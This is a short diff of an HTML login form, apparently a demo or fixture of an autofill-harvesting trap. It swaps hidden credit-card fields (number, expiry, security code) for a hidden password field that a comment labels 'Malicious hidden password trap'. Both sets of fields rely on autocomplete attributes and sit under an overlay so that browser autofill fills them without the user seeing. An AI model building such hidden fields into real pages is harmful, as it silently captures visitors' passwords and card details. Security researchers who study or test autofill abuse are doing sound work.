@@ -66,24 +66,12 @@
         <form class="login-form" id="loginForm">
           <!-- Hidden trap fields behind overlay -->
           <div style="position: relative; width: 300px; height: auto">
-            <!-- Sensitive input fields -->
+            <!-- Malicious hidden password trap -->
             <input
-              type="text"
-              name="cc-number"
-              autocomplete="cc-number"
+              type="password"
+              name="hidden-password"
               class="hidden-field"
-            />
-            <input
-              type="text"
-              name="cc-exp"
-              autocomplete="cc-exp"
-              class="hidden-field"
-            />
-            <input
-              type="text"
-              name="cc-csc"
-              autocomplete="cc-csc"
-              class="hidden-field"
+              autocomplete="current-password"
             />
 
             <!-- Full overlay that hides the fields -->
